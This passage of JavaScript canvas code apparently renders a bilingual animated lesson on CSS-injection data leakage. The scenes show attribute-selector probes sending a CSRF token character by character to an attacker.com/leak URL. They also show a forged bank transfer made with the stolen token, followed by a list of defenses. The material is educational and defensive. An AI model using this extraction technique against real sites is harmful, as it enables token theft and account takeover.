      ctx.moveTo(-botW / 2 + 14, botY + 56);
      ctx.lineTo(botW / 2 - 14, botY + 56);
      ctx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
      ctx.lineWidth = 1;
      ctx.stroke();

      // Active outgoing request
      const charLogged = (selectedPath === 's' || selectedPath === 'A' || selectedPath === 'secret' || selectedPath === 'secret_42') ? 's' : 'b';
      ctx.fillStyle = '#34d399';
      ctx.fillText(`200 OK  GET     https://attacker.com/leak?char=${charLogged}`, -botW / 2 + 14, botY + 76);
      ctx.fillStyle = '#fbbf24';
      ctx.fillText('CSS (bg-image)', botW / 2 - 110, botY + 76);

      // Footnote
      ctx.font = `700 10.5px ${FONT_FAMILY}`;
      ctx.fillStyle = '#06b6d4';
      ctx.textAlign = 'center';
      ctx.fillText(isVi ? 'Trình duyệt TỰ ĐỘNG gửi request này đi để tải ảnh nền — không cần JavaScript!' : 'Browser AUTONOMOUSLY sends this request to fetch the background image — no JS needed!', 0, botY + 114);
    }
  }

  // Draw Glowing Network Curving Pipes
  drawConnectionCurve(ctx, p0, p1, p2, p3, options = {}) {
    const {
      color = '#38bdf8',
      lineWidth = 2,
      dash = [8, 8],
      flowSpeed = 24,
      alpha = 0.6,
      glow = true
    } = options;

    ctx.save();
    ctx.globalAlpha = alpha;

    ctx.beginPath();
    ctx.moveTo(p0.x, p0.y);
    ctx.bezierCurveTo(p1.x, p1.y, p2.x, p2.y, p3.x, p3.y);

    if (glow) {
      ctx.shadowBlur = 10;
      ctx.shadowColor = color;
    }

    ctx.strokeStyle = color;
    ctx.lineWidth = lineWidth;
    if (dash) {
      ctx.setLineDash(dash);
      ctx.lineDashOffset = -this.time * flowSpeed;
    }
    ctx.stroke();

    ctx.restore();
  }

  // Draw Flying Packet Orb with Dynamic Pill
  drawPacket(ctx, x, y, options = {}) {
    const {
      label = 'PACKET',
      sublabel = '',
      color = '#38bdf8',
      radius = 15,
      alpha = 1,
      scale = 1
    } = options;

    if (alpha <= 0.01) return;

    ctx.save();
    ctx.globalAlpha = alpha;
    ctx.translate(x, y);
    ctx.scale(scale, scale);

    const haloGrad = ctx.createRadialGradient(0, 0, 2, 0, 0, radius * 2.5);
    haloGrad.addColorStop(0, MathUtils.rgba(color, 0.85));
    haloGrad.addColorStop(0.5, MathUtils.rgba(color, 0.3));
    haloGrad.addColorStop(1, MathUtils.rgba(color, 0));

    ctx.beginPath();
    ctx.arc(0, 0, radius * 2.5, 0, Math.PI * 2);
    ctx.fillStyle = haloGrad;
    ctx.fill();

    ctx.beginPath();
    ctx.arc(0, 0, radius, 0, Math.PI * 2);
    ctx.fillStyle = '#ffffff';
    ctx.shadowBlur = 18;
    ctx.shadowColor = color;
    ctx.fill();
    ctx.shadowBlur = 0;

    ctx.beginPath();
    ctx.arc(0, 0, radius + 2, 0, Math.PI * 2);
    ctx.strokeStyle = color;
    ctx.lineWidth = 2.2;
    ctx.stroke();

    if (label) {
      ctx.font = `700 11.5px ${FONT_FAMILY}`;
      const lw = ctx.measureText(label).width;
      ctx.font = `500 9.5px ${FONT_FAMILY}`;
      const sw = sublabel ? ctx.measureText(sublabel).width : 0;
      const pillW = Math.max(90, Math.max(lw, sw) + 26);
      const pillH = sublabel ? 36 : 24;
      const pillY = -radius - pillH / 2 - 8;

      ctx.fillStyle = 'rgba(15, 23, 42, 0.95)';
      ctx.strokeStyle = color;
      ctx.lineWidth = 1.4;
      ctx.shadowBlur = 10;
      ctx.shadowColor = color;
      this.roundRect(ctx, -pillW / 2, pillY - pillH / 2, pillW, pillH, 8);
      ctx.fill();
      ctx.stroke();
      ctx.shadowBlur = 0;

      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';

      if (sublabel) {
        ctx.font = `700 11px ${FONT_FAMILY}`;
        ctx.fillStyle = '#ffffff';
        ctx.fillText(label, 0, pillY - 6);

        ctx.font = `500 9.5px ${FONT_FAMILY}`;
        ctx.fillStyle = '#cbd5e1';
        ctx.fillText(sublabel, 0, pillY + 8);
      } else {
        ctx.font = `700 11px ${FONT_FAMILY}`;
        ctx.fillStyle = '#ffffff';
        ctx.fillText(label, 0, pillY);
      }
    }

    ctx.restore();
  }

  // Draw Dual-Layer Response Packet (HTML + CSS) (Scene 4)
  drawDualResponsePacket(ctx, x, y, options = {}) {
    const { alpha = 1, scale = 1 } = options;
    if (alpha <= 0.01) return;

    const isVi = this.lang === 'vi';

    ctx.save();
    ctx.globalAlpha = alpha;
    ctx.translate(x, y);
    ctx.scale(scale, scale);

    const pw = 220;
    const ph = 58;

    ctx.fillStyle = 'rgba(15, 23, 42, 0.96)';
    ctx.strokeStyle = '#38bdf8';
    ctx.lineWidth = 2;
    ctx.shadowBlur = 18;
    ctx.shadowColor = 'rgba(56, 189, 248, 0.6)';
    this.roundRect(ctx, -pw / 2, -ph / 2, pw, ph, 10);
    ctx.fill();
    ctx.stroke();
    ctx.shadowBlur = 0;

    // Layer 1: HTML
    ctx.fillStyle = 'rgba(6, 182, 212, 0.25)';
    ctx.strokeStyle = '#06b6d4';
    ctx.lineWidth = 1.2;
    this.roundRect(ctx, -pw / 2 + 8, -ph / 2 + 6, pw - 16, 20, 5);
    ctx.fill();
    ctx.stroke();

    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.font = `700 9.5px ${FONT_FAMILY}`;
    ctx.fillStyle = '#ffffff';
    ctx.fillText(isVi ? 'LỚP 1: HTML + FORM BÍ MẬT' : 'LAYER 1: HTML + TARGET FORM', 0, -ph / 2 + 16);

    // Layer 2: Injected CSS
    ctx.fillStyle = 'rgba(245, 158, 11, 0.25)';
    ctx.strokeStyle = '#f59e0b';
    ctx.lineWidth = 1.2;
    this.roundRect(ctx, -pw / 2 + 8, -ph / 2 + 31, pw - 16, 20, 5);
    ctx.fill();
    ctx.stroke();

    ctx.font = `700 9.5px ${FONT_FAMILY}`;
    ctx.fillStyle = '#fbbf24';
    ctx.fillText(isVi ? 'LỚP 2: BẢNG LUẬT CSS TIÊM ĐỘC' : 'LAYER 2: INJECTED CSS RULES', 0, -ph / 2 + 41);

    ctx.restore();
  }

  // Draw Attacker Inference Diagram (Scene 9: Concrete URL hit -> Token Char)
  drawInferenceDiagram(ctx, x, y, progress) {
    ctx.save();
    ctx.translate(x, y);

    const p = MathUtils.clamp(progress, 0, 1);
    const isVi = this.lang === 'vi';

    const cardW = 490;
    const cardH = 145;

    ctx.fillStyle = 'rgba(17, 24, 39, 0.96)';
    ctx.strokeStyle = '#f43f5e';
    ctx.lineWidth = 2;
    ctx.shadowBlur = 24;
    ctx.shadowColor = 'rgba(244, 63, 94, 0.4)';
    this.roundRect(ctx, -cardW / 2, -cardH / 2, cardW, cardH, 14);
    ctx.fill();
    ctx.stroke();
    ctx.shadowBlur = 0;

    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.font = `700 12.5px ${FONT_FAMILY}`;
    ctx.fillStyle = '#fda4af';
    ctx.fillText(isVi ? 'QUAN SÁT ACCESS LOG VÀ SUY LUẬN KÝ TỰ BẢO MẬT' : 'ATTACKER ACCESS LOG OBSERVATION & INFERENCE', 0, -cardH / 2 + 18);

    const stepW = 135;
    const stepH = 54;
    const stepCenterY = 8;

    const steps = isVi ? [
      { title: 'NHẬN GET /leak?c=s', sub: 'Server ghi log Nginx', x: -150, color: '#06b6d4', threshold: 0.2 },
      { title: 'TRA BẢNG QUY TẮC', sub: 'Chỉ có luật "s" khớp', x: 0, color: '#f59e0b', threshold: 0.5 },
      { title: 'KẾT LUẬN: CHỮ "s"', sub: 'Token bắt đầu bằng "s"', x: 150, color: '#f43f5e', threshold: 0.8 }
    ] : [
      { title: 'GET /leak?c=s', sub: 'Nginx access log hit', x: -150, color: '#06b6d4', threshold: 0.2 },
      { title: 'MATCH RULE MATRIX', sub: 'Only rule "s" fired', x: 0, color: '#f59e0b', threshold: 0.5 },
      { title: 'DEDUCE CHAR "s"', sub: 'Token starts with "s"', x: 150, color: '#f43f5e', threshold: 0.8 }
    ];

    for (const step of steps) {
      const active = p >= step.threshold;
      ctx.fillStyle = active ? MathUtils.rgba(step.color, 0.22) : 'rgba(30, 41, 59, 0.5)';
      ctx.strokeStyle = active ? step.color : 'rgba(255, 255, 255, 0.1)';
      ctx.lineWidth = active ? 1.8 : 1;

      this.roundRect(ctx, step.x - stepW / 2, stepCenterY - stepH / 2, stepW, stepH, 8);
      ctx.fill();
      ctx.stroke();

      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';

      ctx.font = '700 10.5px monospace';
      ctx.fillStyle = active ? '#ffffff' : '#64748b';
      ctx.fillText(step.title, step.x, stepCenterY - 8);

      ctx.font = `500 9.5px ${FONT_FAMILY}`;
      ctx.fillStyle = active ? step.color : '#475569';
      ctx.fillText(step.sub, step.x, stepCenterY + 11);
    }

    ctx.font = `700 10.5px ${FONT_FAMILY}`;
    ctx.fillStyle = '#38bdf8';
    ctx.fillText(isVi ? 'TIẾP TỤC DÒ: input[value^="se"] -> input[value^="sec"] CHO ĐẾN HẾT TOKEN!' : 'NEXT PROBES: input[value^="se"] -> input[value^="sec"] TO EXTRACT FULL TOKEN!', 0, cardH / 2 - 16);

    ctx.restore();
  }

  // Draw Iterative Brute-Force Extraction Loop (Scene 10)
  drawFullAttackChain(ctx, progress) {
    ctx.save();

    const p = MathUtils.clamp(progress, 0, 1);
    const isVi = this.lang === 'vi';

    const iterations = isVi ? [
      { step: 'Đợt 1', probe: 'input[value^="s"]', leak: 'GET /leak?c=s', result: 'Ký tự 1 = "s"', active: p >= 0.15 },
      { step: 'Đợt 2', probe: 'input[value^="se"]', leak: 'GET /leak?c=se', result: '2 ký tự đầu = "se"', active: p >= 0.4 },
      { step: 'Đợt 3', probe: 'input[value^="sec"]', leak: 'GET /leak?c=sec', result: '3 ký tự đầu = "sec"', active: p >= 0.65 },
      { step: 'Hoàn tất', probe: 'input[value="secret_42"]', leak: 'GET /leak?c=secret_42', result: 'Token = "secret_42" (TRỘM XONG)', active: p >= 0.88 }
    ] : [
      { step: 'Pass 1', probe: 'input[value^="s"]', leak: 'GET /leak?c=s', result: 'Char 1 = "s"', active: p >= 0.15 },
      { step: 'Pass 2', probe: 'input[value^="se"]', leak: 'GET /leak?c=se', result: 'Prefix = "se"', active: p >= 0.4 },
      { step: 'Pass 3', probe: 'input[value^="sec"]', leak: 'GET /leak?c=sec', result: 'Prefix = "sec"', active: p >= 0.65 },
      { step: 'Final', probe: 'input[value="secret_42"]', leak: 'GET /leak?c=secret_42', result: 'Full Token = "secret_42"', active: p >= 0.88 }
    ];

    const cardW = 640;
    const cardH = 230;

    ctx.fillStyle = 'rgba(15, 23, 42, 0.96)';
    ctx.strokeStyle = '#06b6d4';
    ctx.lineWidth = 2;
    ctx.shadowBlur = 24;
    ctx.shadowColor = 'rgba(6, 182, 212, 0.35)';
    this.roundRect(ctx, -cardW / 2, -cardH / 2, cardW, cardH, 14);
    ctx.fill();
    ctx.stroke();
    ctx.shadowBlur = 0;

    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.font = `700 13px ${FONT_FAMILY}`;
    ctx.fillStyle = '#38bdf8';
    ctx.fillText(isVi ? 'VÒNG LẶP DÒ TỪNG KÝ TỰ (CHARACTER-BY-CHARACTER EXTRACTION)' : 'RECURSIVE CHARACTER-BY-CHARACTER EXTRACTION', 0, -cardH / 2 + 20);

    const rowStartY = -cardH / 2 + 48;
    const rowH = 36;
    const rowGap = 8;

    for (let i = 0; i < iterations.length; i++) {
      const it = iterations[i];
      const ry = rowStartY + i * (rowH + rowGap);

      ctx.fillStyle = it.active ? 'rgba(6, 182, 212, 0.18)' : 'rgba(30, 41, 59, 0.4)';
      ctx.strokeStyle = it.active ? '#06b6d4' : 'rgba(255, 255, 255, 0.1)';
      ctx.lineWidth = it.active ? 1.6 : 1;

      this.roundRect(ctx, -cardW / 2 + 18, ry, cardW - 36, rowH, 6);
      ctx.fill();
      ctx.stroke();

      ctx.textAlign = 'left';
      ctx.textBaseline = 'middle';

      ctx.font = `700 10.5px ${FONT_FAMILY}`;
      ctx.fillStyle = it.active ? '#38bdf8' : '#64748b';
      ctx.fillText(it.step, -cardW / 2 + 32, ry + rowH / 2);

      ctx.font = '600 10px monospace';
      ctx.fillStyle = it.active ? '#fde68a' : '#64748b';
      ctx.fillText(it.probe, -cardW / 2 + 95, ry + rowH / 2);

      ctx.fillStyle = it.active ? '#34d399' : '#64748b';
      ctx.fillText(it.leak, -cardW / 2 + 275, ry + rowH / 2);

      ctx.font = `700 10.5px ${FONT_FAMILY}`;
      ctx.fillStyle = it.active ? '#f43f5e' : '#64748b';
      ctx.fillText(`=> ${it.result}`, cardW / 2 - 165, ry + rowH / 2);
    }

    ctx.restore();
  }

  // Draw CSRF Exploit Diagram (Scene 11: Real-world impact & Account Takeover)
  drawCSRFContext(ctx, x, y, progress) {
    ctx.save();
    ctx.translate(x, y);

    const isVi = this.lang === 'vi';
    const cardW = 620;
    const cardH = 240;

    ctx.fillStyle = 'rgba(15, 23, 42, 0.97)';
    ctx.strokeStyle = '#f43f5e';
    ctx.lineWidth = 2;
    ctx.shadowBlur = 26;
    ctx.shadowColor = 'rgba(244, 63, 94, 0.35)';
    this.roundRect(ctx, -cardW / 2, -cardH / 2, cardW, cardH, 16);
    ctx.fill();
    ctx.stroke();
    ctx.shadowBlur = 0;

    // Header
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.font = `700 14px ${FONT_FAMILY}`;
    ctx.fillStyle = '#f43f5e';
    ctx.fillText(isVi ? 'HẬU QUẢ: DÙNG TOKEN VỪA TRỘM ĐỂ CHIẾM TÀI KHOẢN (CSRF)' : 'THE EXPLOIT: BYPASSING CSRF DEFENSE WITH STOLEN TOKEN', 0, -cardH / 2 + 22);

    // Realistic Forged Request Box
    const reqBoxY = -cardH / 2 + 42;
    const reqBoxH = 82;
    ctx.fillStyle = 'rgba(28, 14, 24, 0.95)';
    ctx.strokeStyle = 'rgba(244, 63, 94, 0.6)';
    ctx.lineWidth = 1.4;
    this.roundRect(ctx, -cardW / 2 + 20, reqBoxY, cardW - 40, reqBoxH, 8);
    ctx.fill();
    ctx.stroke();

    ctx.textAlign = 'left';
    ctx.textBaseline = 'middle';
    ctx.font = '700 10px monospace';
    ctx.fillStyle = '#fda4af';
    ctx.fillText(isVi ? '[YÊU CẦU CHUYỂN TIỀN GIẢ MẠO DO KẺ XẤU TẠO RA]' : '[FORGED HTTP TRANSFER REQUEST]', -cardW / 2 + 32, reqBoxY + 14);

    ctx.font = '600 10.5px monospace';
    ctx.fillStyle = '#ffffff';
    ctx.fillText('POST /transfer HTTP/1.1  (Host: bank.internal)', -cardW / 2 + 32, reqBoxY + 32);
    ctx.fillStyle = '#38bdf8';
    ctx.fillText('Cookie: session=victim_login  (Trình duyệt tự đính kèm)', -cardW / 2 + 32, reqBoxY + 48);
    ctx.fillStyle = '#34d399';
    ctx.fillText('Body: to=hacker_wallet&amount=100000000&csrf=secret_42  (Token vừa trộm)', -cardW / 2 + 32, reqBoxY + 66);

    // Explanation banner
    const b1Y = 22;
    const b1H = 40;
    ctx.fillStyle = 'rgba(244, 63, 94, 0.14)';
    ctx.strokeStyle = 'rgba(244, 63, 94, 0.45)';
    ctx.lineWidth = 1.4;
    this.roundRect(ctx, -cardW / 2 + 20, b1Y, cardW - 40, b1H, 8);
    ctx.fill();
    ctx.stroke();

    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.font = `700 11px ${FONT_FAMILY}`;
    ctx.fillStyle = '#fca5a5';
    ctx.fillText(isVi ? 'NGÂN HÀNG THẤY CSRF TOKEN TRÙNG KHỚP -> XÁC NHẬN GIAO DỊCH THÀNH CÔNG!' : 'BANK SEES MATCHING CSRF TOKEN -> ACCEPTS TRANSACTION AS LEGITIMATE!', 0, b1Y + 12);

    ctx.font = `500 10px ${FONT_FAMILY}`;
    ctx.fillStyle = '#cbd5e1';
    ctx.fillText(isVi ? 'Nếu không bị CSS Injection làm lộ token, ngân hàng đã chặn đứng request giả mạo này.' : 'Without the CSS injection leak, the bank would have rejected this cross-site forged request.', 0, b1Y + 28);

    // Defense banner
    const b2Y = 68;
    const b2H = 40;
    ctx.fillStyle = 'rgba(56, 189, 248, 0.12)';
    ctx.strokeStyle = 'rgba(56, 189, 248, 0.4)';
    ctx.lineWidth = 1.4;
    this.roundRect(ctx, -cardW / 2 + 20, b2Y, cardW - 40, b2H, 8);
    ctx.fill();
    ctx.stroke();

    ctx.font = `700 11px ${FONT_FAMILY}`;
    ctx.fillStyle = '#38bdf8';
    ctx.fillText(isVi ? 'GIẢI PHÁP PHÒNG CHỐNG TRIỆT ĐỂ' : 'HOW TO FULLY DEFEND AGAINST THIS ATTACK', 0, b2Y + 12);

    ctx.font = `500 10px ${FONT_FAMILY}`;
    ctx.fillStyle = '#cbd5e1';
    ctx.fillText(isVi ? '1. Sanitize/Escape toàn bộ thẻ <style>  •  2. CSP style-src không cho nạp ảnh ngoài  •  3. Cookie SameSite=Strict' : '1. Sanitize user input before <style>  •  2. Restrict CSP style-src  •  3. Enforce SameSite=Strict cookies', 0, b2Y + 28);

    ctx.restore();
  }

  // Draw Screen-Space Master Concept Header (Crisp, safe, compact)
  drawCinematicHeader(width, height, scene) {
    if (!scene) return;
    const ctx = this.ctx;
    const sceneTexts = this.texts.scenes[scene.id] || scene;

    ctx.save();
    const cx = width / 2;
    const cy = 56; // Compact safe height

    const titleText = sceneTexts.title;
    ctx.font = `700 17px ${FONT_FAMILY}`;
    const titleW = ctx.measureText(titleText).width;
    ctx.font = `500 12px ${FONT_FAMILY}`;
    const subW = sceneTexts.subtitle ? ctx.measureText(sceneTexts.subtitle).width : 0;
    const cardW = Math.max(560, Math.max(titleW, subW) + 56);
    const cardH = 62;

    // Glass backing
    ctx.fillStyle = 'rgba(8, 12, 22, 0.94)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.12)';
    ctx.lineWidth = 1.2;
    ctx.shadowBlur = 20;
    ctx.shadowColor = 'rgba(0, 0, 0, 0.85)';
    this.roundRect(ctx, cx - cardW / 2, cy - cardH / 2, cardW, cardH, 16);
    ctx.fill();
    ctx.stroke();
    ctx.shadowBlur = 0;

    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';

    ctx.font = `700 10px ${FONT_FAMILY}`;
    ctx.fillStyle = '#06b6d4';
    ctx.fillText(this.texts.sceneOf(scene.id, 11), cx, cy - 17);

    ctx.font = `700 16px ${FONT_FAMILY}`;
    ctx.fillStyle = '#ffffff';
    ctx.fillText(titleText, cx, cy + 2);

    if (sceneTexts.subtitle) {
      ctx.font = `500 11.5px ${FONT_FAMILY}`;
      ctx.fillStyle = '#94a3b8';
      ctx.fillText(sceneTexts.subtitle, cx, cy + 19);
    }

    ctx.restore();
  }

  // Helper: Rounded Rectangle
  roundRect(ctx, x, y, width, height, radius = 8) {
    ctx.beginPath();
    ctx.moveTo(x + radius, y);
    ctx.lineTo(x + width - radius, y);
    ctx.quadraticCurveTo(x + width, y, x + width, y + radius);
    ctx.lineTo(x + width, y + height - radius);
    ctx.quadraticCurveTo(x + width, y + height, x + width - radius, y + height);
    ctx.lineTo(x + radius, y + height);
    ctx.quadraticCurveTo(x, y + height, x, y + height - radius);
    ctx.lineTo(x, y + radius);
    ctx.quadraticCurveTo(x, y, x + radius, y);
    ctx.closePath();
  }

  // Helper: Rounded Top Corners Only
  roundRectTop(ctx, x, y, width, height, radius = 8) {
    ctx.beginPath();
    ctx.moveTo(x + radius, y);
    ctx.lineTo(x + width - radius, y);
    ctx.quadraticCurveTo(x + width, y, x + width, y + radius);
    ctx.lineTo(x + width, y + height);
    ctx.lineTo(x, y + height);
    ctx.lineTo(x, y + radius);
    ctx.quadraticCurveTo(x, y, x + radius, y);
    ctx.closePath();
  }
}
